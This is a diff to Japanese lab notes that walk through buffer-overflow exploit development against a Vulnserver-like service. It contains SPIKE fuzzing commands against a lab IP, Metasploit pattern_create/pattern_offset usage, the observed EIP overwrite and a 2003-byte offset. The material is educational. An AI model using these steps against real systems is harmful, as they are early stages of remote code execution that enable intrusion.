@@ -428,13 +428,15 @@
   TRUN [trun_value]
   ```
   ```sh
-  # Fuziing、デバッガではRunnningであるため、どうやらSTATSコマンドは脆弱ではなさそう
+  # Fuziing、デバッガで監視しているプロセスはRunnningであるため、STATSコマンドは脆弱ではなさそう
   echo 's_readline();\ns_string("STATS ");\ns_string_variable("0");' > stats.spk
   generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
   
-  # Fuziing、デバッガがPausedであるため、TRUNコマンドにバッファオーバフローの脆弱性がありそう
+  # Fuziing、デバッガで監視しているプロセスはPausedであるため、TRUNコマンドにバッファオーバフローの脆弱性がありそう
   echo 's_readline();\ns_string("TRUN ");\ns_string_variable("0");' > stats.spk
   generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
   ```
-  https://github.com/FishyStix12/WHPython_v1.1/blob/main/fuzzywuzzy.py
-  `./fuzz.py`
+  [fuzzywuzzy.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/fuzzywuzzy.py)を使ってTURNコマンドの入力値が何バイトでクラッシュするのが確認すると、11800バイトのデータを受信した後にクラッシュしたことを示すメッセージが表示されるが、デバッガ上ではEIPレジスタは上書きされていなかった（バイトサイズは環境によって変化する）  
+  `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900`で生成した文字列を[WIns_overflow.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/WIns_overflow.py)でターゲットに送信、デバッガ上でEIPレジスタが「386F4337」に上書きされていた  
+  `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337`で2003バイトのオフセット値であることが分かった
+  badcharはないらしい
